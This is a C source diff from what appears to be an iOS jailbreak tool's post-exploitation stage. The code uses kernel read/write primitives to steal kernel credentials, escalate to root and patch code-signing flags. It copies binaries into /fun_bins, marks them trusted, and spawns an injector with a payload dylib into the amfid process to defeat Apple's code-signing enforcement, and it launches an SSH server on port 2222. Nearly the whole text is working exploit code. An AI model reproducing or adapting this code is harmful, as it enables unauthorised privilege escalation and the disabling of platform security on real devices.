@@ -212,6 +212,16 @@ unsigned offsetof_special = 2 * sizeof(long); // host::special
 #define CS_PLATFORM_BINARY	0x4000000	/* this is a platform binary */
 #define CS_PLATFORM_PATH	0x8000000	/* platform binary by the fact of path (osx only) */
 
+char *itoa(long n)
+{
+    int len = n==0 ? 1 : floor(log10l(labs(n)))+1;
+    if (n<0) len++; // room for negative sign '-'
+    
+    char    *buf = calloc(sizeof(char), len+1); // +1 for null
+    snprintf(buf, len+1, "%ld", n);
+    return   buf;
+}
+
 kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
 kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
 kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
@@ -347,7 +357,8 @@ do { \
 	uint32_t our_pid = getpid();
 	uint64_t our_proc = 0;
 	uint64_t kern_proc = 0;
-	uint64_t container_proc = 0;
+	uint64_t amfid_proc = 0;
+    uint32_t amfid_pid = 0;
 	
 	uint64_t proc = rk64(find_allproc());
 	while (proc) {
@@ -359,11 +370,10 @@ do { \
 			our_proc = proc;
 		} else if (pid == 0) {
 			kern_proc = proc;
-		} else if (strstr(name, "containermanager")) {
-			container_proc = proc;
 		} else if (strstr(name, "amfid")) {
 			printf("found amfid - getting task\n");
-			
+            amfid_proc = proc;
+            amfid_pid = pid;
 		}
 		if (pid != 0) {
 			uint32_t csflags = rk32(proc + offsetof_p_csflags);
@@ -388,11 +398,6 @@ do { \
 
 	KCALL(find_bcopy(), kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t), 0, 0, 0, 0);
 	KCALL(find_bzero(), self_ucred + 0x18, 12, 0, 0, 0, 0, 0);
-
-	
-	// Get containermanagerd's creds
-	uint64_t ccred = rk64(container_proc+0x100);
-	wk64(container_proc+0x100, self_ucred);
 	
 	setuid(0);
 	
@@ -447,6 +452,48 @@ do { \
     while (getline(&ln, &len, fp) != -1)
         fputs(ln, stdout);
     fclose(fp);
+    
+    // Prepare our binaries
+    {
+        if (!file_exist("/fun_bins")) {
+            printf("making /fun_bins");
+            mkdir("/fun_bins", 0777);
+        }
+        
+        /* uncomment if you need to replace the binaries */
+        unlink("/fun_bins/inject_amfid");
+        unlink("/fun_bins/amfid_payload.dylib");
+        //        unlink("/fun_bins/test.dylib");
+        
+        if (!file_exist("/fun_bins/inject_amfid")) {
+            printf("copy /fun_bins/inject_amfid\n");
+            cp("/fun_bins/inject_amfid", progname("inject_amfid"));
+            chmod("/fun_bins/inject_amfid", 0777);
+        }
+        if (!file_exist("/fun_bins/amfid_payload.dylib")) {
+            printf("copy /fun_bins/amfid_payload.dylib\n");
+            cp("/fun_bins/amfid_payload.dylib", progname("amfid_payload.dylib"));
+            chmod("/fun_bins/amfid_payload.dylib", 0777);
+        }
+        if (!file_exist("/fun_bins/test.dylib")) {
+            printf("copy /fun_bins/test.dylib\n");
+            cp("/fun_bins/test.dylib", progname("test.dylib"));
+            chmod("/fun_bins/test.dylib", 0777);
+        }
+        
+        printf("[fun] copied the required binaries into the right places\n");
+    }
+    
+    inject_trusts(1, (const char **)&(const char*[]){"/fun_bins/inject_amfid"});
+    inject_trusts(1, (const char **)&(const char*[]){"/fun_bins/amfid_payload.dylib"});
+    
+#define BinaryLocation "/fun_bins/inject_amfid"
+    
+    pid_t pd;
+    
+    const char* args[] = {BinaryLocation, itoa(amfid_pid), NULL};
+    int rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args, NULL);
+    
 //	uint8_t launchd[19];
 //	kread(find_amficache()+0x11358, launchd, 19);
 //
@@ -463,8 +510,6 @@ do { \
     cp(tar, progname("tar"));
     chmod(tar, 0777);
     inject_trusts(1, (const char **)&(const char*[]){tar});
-    
-    int rv;
 
     //rv = startprog(kern_ucred, true, tar, (char **)&(const char*[]){ tar, "-xpf", progname("cydia.tar"), "-C", "/", NULL });
     //inject_trusts(1, (const char **)&(const char*[]){"/Applications/Cydia.app/Cydia"});
@@ -496,13 +541,6 @@ do { \
         const char *dbear = "/" BOOTSTRAP_PREFIX "/usr/local/bin/dropbear";
         rv = startprog(kern_ucred, true, dbear, (char **)&(const char*[]){ dbear, "-S", "/" BOOTSTRAP_PREFIX, "-p", "2222", NULL }, &environ);
     }
-
-//	sleep(5);
-//	kill(pd, SIGKILL);
-
-	if (container_proc) {
-		wk64(container_proc + offsetof_p_ucred, ccred);
-	}
 	
 	
 	// zzz AMFI sucks..
@@ -542,7 +580,7 @@ do { \
 	// Cleanup
 
 	wk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
-	
+	wk64(rk64(kern_ucred+0x78)+0x8, 0);
 }
 
 
